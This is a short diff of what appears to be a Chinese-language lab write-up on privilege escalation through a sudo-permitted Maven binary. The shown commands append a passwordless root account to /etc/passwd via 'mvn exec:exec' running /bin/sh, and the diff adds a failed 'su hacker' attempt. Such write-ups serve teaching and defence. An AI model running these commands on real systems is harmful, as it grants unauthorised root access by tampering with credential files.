@@ -667,7 +667,8 @@ uid=1002(terra536) gid=1002(terra536) groups=1002(terra536)
 ```bash
 bash-5.2# echo 'hacker::0:0:root:/root:/bin/bash' > /tmp/newpasswd
 bash-5.2# sudo /usr/bin/mvn exec:exec -Dexec.executable=/bin/sh -Dexec.args="-c 'cat /tmp/newpasswd >> /etc/passwd'"
-
+bash-5.2# su hacker
+su: incorrect password
 ```
 - root 运行 `/usr/bin/mvn`
 - maven 执行 `/bin/sh`
